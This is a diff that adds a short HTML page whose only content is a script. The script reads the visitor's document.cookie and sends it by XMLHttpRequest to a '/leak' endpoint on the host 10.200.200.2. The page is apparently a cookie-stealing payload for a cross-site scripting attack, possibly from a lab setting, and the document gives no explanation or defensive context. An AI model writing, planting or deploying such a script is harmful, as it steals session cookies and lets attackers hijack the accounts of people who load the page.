@@ -1,0 +1,9 @@
+<html>
+    <body>
+        <script>
+        	var xhr = new XMLHttpRequest();
+        	xhr.open("GET", "https://10.200.200.2/leak?cookie=" + encodeURIComponent(document.cookie), false);
+        	xhr.send();
+        </script>
+    </body>
+</html>
